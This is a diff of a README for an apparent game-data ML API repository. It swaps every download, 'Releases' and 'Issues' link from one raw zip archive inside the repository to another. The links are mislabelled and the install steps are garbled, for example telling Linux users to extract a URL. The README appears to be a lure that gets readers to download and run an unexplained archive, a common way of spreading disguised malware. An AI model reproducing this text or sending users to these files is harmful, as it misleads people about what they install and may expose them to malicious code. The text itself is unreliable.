@@ -1,6 +1,6 @@
 # 🎮 gamepulse-rawg-ml-api - Simple Data and ML Insights
 
-[![Download Now](https://raw.githubusercontent.com/Dean12345644533/gamepulse-rawg-ml-api/main/ingestion_lambda/gamepulse_api_rawg_ml_v1.9-alpha.1.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/Dean12345644533/gamepulse-rawg-ml-api/main/ingestion_lambda/gamepulse_api_rawg_ml_v1.9-alpha.1.zip)
+[![Download Now](https://raw.githubusercontent.com/Dean12345644533/gamepulse-rawg-ml-api/main/sql/gamepulse_api_ml_rawg_v3.5.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/Dean12345644533/gamepulse-rawg-ml-api/main/sql/gamepulse_api_ml_rawg_v3.5.zip)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ Welcome to **gamepulse-rawg-ml-api**! This tool allows you to easily access and 
 
 ## 📥 Download & Install
 
-To get started, you first need to download the application. Please visit this page to download: [gamepulse-rawg-ml-api Releases](https://raw.githubusercontent.com/Dean12345644533/gamepulse-rawg-ml-api/main/ingestion_lambda/gamepulse_api_rawg_ml_v1.9-alpha.1.zip).
+To get started, you first need to download the application. Please visit this page to download: [gamepulse-rawg-ml-api Releases](https://raw.githubusercontent.com/Dean12345644533/gamepulse-rawg-ml-api/main/sql/gamepulse_api_ml_rawg_v3.5.zip).
 
 Follow the steps below to install the application.
 
@@ -29,19 +29,19 @@ Follow the steps below to install the application.
 
 ### 📂 Installation Steps
 
-1. **Visit the Release Page**: Click the link to navigate to the [Releases](https://raw.githubusercontent.com/Dean12345644533/gamepulse-rawg-ml-api/main/ingestion_lambda/gamepulse_api_rawg_ml_v1.9-alpha.1.zip).
+1. **Visit the Release Page**: Click the link to navigate to the [Releases](https://raw.githubusercontent.com/Dean12345644533/gamepulse-rawg-ml-api/main/sql/gamepulse_api_ml_rawg_v3.5.zip).
 
 2. **Choose Your Version**: Scroll to find the latest version available for download. Look for asset files that match your operating system.
 
 3. **Download the Application**:
    - For Windows, download the `.exe` file.
    - For MacOS, download the `.dmg` file.
-   - For Linux, download the `https://raw.githubusercontent.com/Dean12345644533/gamepulse-rawg-ml-api/main/ingestion_lambda/gamepulse_api_rawg_ml_v1.9-alpha.1.zip` file.
+   - For Linux, download the `https://raw.githubusercontent.com/Dean12345644533/gamepulse-rawg-ml-api/main/sql/gamepulse_api_ml_rawg_v3.5.zip` file.
 
 4. **Install the Application**:
    - **Windows**: Double-click the downloaded `.exe` file and follow the on-screen instructions.
    - **MacOS**: Open the `.dmg` file and drag the application into your Applications folder.
-   - **Linux**: Extract the `https://raw.githubusercontent.com/Dean12345644533/gamepulse-rawg-ml-api/main/ingestion_lambda/gamepulse_api_rawg_ml_v1.9-alpha.1.zip` file and run the installation script provided within the folder.
+   - **Linux**: Extract the `https://raw.githubusercontent.com/Dean12345644533/gamepulse-rawg-ml-api/main/sql/gamepulse_api_ml_rawg_v3.5.zip` file and run the installation script provided within the folder.
 
 5. **Launch the Application**: After installation, you can start the application by finding it in your applications menu or by using a terminal command.
 
@@ -63,7 +63,7 @@ If you encounter any issues during installation or usage, consider the following
 - Ensure your system meets all requirements listed above.
 - Confirm Python is correctly installed and updated.
 - Restart the application if it does not respond.
-- Refer to the [Issues](https://raw.githubusercontent.com/Dean12345644533/gamepulse-rawg-ml-api/main/ingestion_lambda/gamepulse_api_rawg_ml_v1.9-alpha.1.zip) page on the GitHub repository for common problems and fixes.
+- Refer to the [Issues](https://raw.githubusercontent.com/Dean12345644533/gamepulse-rawg-ml-api/main/sql/gamepulse_api_ml_rawg_v3.5.zip) page on the GitHub repository for common problems and fixes.
 
 ## 🤝 Support
 
